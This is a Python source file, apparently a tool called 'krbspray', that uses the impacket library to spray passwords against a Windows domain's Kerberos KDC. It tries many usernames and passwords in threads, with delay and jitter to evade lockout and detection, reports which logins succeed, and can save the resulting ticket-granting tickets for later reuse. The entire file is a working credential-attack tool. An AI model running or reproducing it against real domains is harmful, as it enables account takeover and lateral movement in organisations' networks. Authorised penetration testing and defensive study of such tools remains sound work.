from argparse import ArgumentParser, BooleanOptionalAction, Namespace
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, Generator
import concurrent.futures
import json
import random
import time

from impacket.krb5.ccache import CCache
from impacket.krb5.constants import PrincipalNameType
from impacket.krb5.crypto import Key
from impacket.krb5.kerberosv5 import KerberosError
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal


def uint(value: str) -> int:
    result = int(value)
    if result < 0:
        raise ValueError('invalid unsigned integer')
    return result


def main() -> None:
    entrypoint = ArgumentParser()
    entrypoint.add_argument('--threads', type=uint, default=1, metavar='UINT')
    entrypoint.add_argument('--delay', type=uint, default=0, metavar='SECONDS')
    entrypoint.add_argument('--jitter', type=uint, default=0, metavar='SECONDS')
    group = entrypoint.add_argument_group('auth')
    group.add_argument('-d', '--domain', required=True, metavar='FQDN')
    group.add_argument('-K', '--kdc', metavar='FQDN')
    group.add_argument('-u', '--user', action='append', default=[], metavar='STRING')
    group.add_argument('-U', '--users', action='append', type=Path, default=[], metavar='FILE')
    group.add_argument('-p', '--password', action='append', default=[], metavar='STRING')
    group.add_argument('-P', '--passwords', action='append', type=Path, default=[], metavar='FILE')
    group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS')
    group.add_argument('-C', '--credentials', action='append', type=Path, default=[], metavar='FILE')
    # add support for spraying nthash/rc4
    group.add_argument('-s', '--save', action=BooleanOptionalAction, default=False)
    opts = entrypoint.parse_args()
    if not (((opts.user or opts.users) and (opts.password or opts.passwords)) or opts.credential or opts.credentials):
        print('error: users, passwords or credentials missing')
        print()
        entrypoint.print_help()
        exit(1)

    for result in spray(opts):
        print(json.dumps(result))


def spray(opts: Namespace) -> Generator[dict[str, Any], None, None]:
    with ThreadPoolExecutor(max_workers=opts.threads) as pool:
        futures = []
        for username in generate(opts.user, opts.users):
            for password in generate(opts.password, opts.passwords):
                future = pool.submit(authenticate, opts, (username, password))
                futures.append(future)
        for credential in generate(opts.credential, opts.credentials):
            username, password = credential.split(':', maxsplit=1)
            future = pool.submit(authenticate, opts, (username, password))
            futures.append(future)
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            yield result


def generate(entries: list[str], paths: list[Path]) -> Generator[str, None, None]:
    for entry in entries:
        yield entry
    for path in paths:
        with open(path, 'r') as file:
            for line in file:
                yield line.rstrip('\n')


def authenticate(opts: Namespace, credential: tuple[str, str]) -> dict[str, Any]:
    username, password = credential

    principal = Principal(username, type=PrincipalNameType.NT_PRINCIPAL.value)  # type: ignore
    ticket_path = None
    try:
        ticket, _cipher, old_session_key, session_key = getKerberosTGT(clientName=principal, password=password, lmhash='', nthash='', aesKey='', domain=opts.domain, kdcHost=opts.kdc)
        error = 'KDC_ERR_NONE'
        if opts.save:
            ticket_path = save_ticket(opts.domain, username, ticket, old_session_key, session_key)
    except KerberosError as e:
        error = next(iter(e.getErrorString()))
    time.sleep(random.randint(opts.delay - opts.jitter, opts.delay + opts.jitter))
    return dict(username=username, password=password, ticket=ticket_path, error=error)


def save_ticket(domain: str, username: str, ticket: bytes, old_session_key: Key, session_key: Key) -> str:
    ccache = CCache()
    ccache.fromTGT(ticket, old_session_key, session_key)
    path = f'krbspray-{username}@{domain}.ccache'
    assert '..' not in path
    ccache.saveFile(path)
    return path


if __name__ == '__main__':
    main()
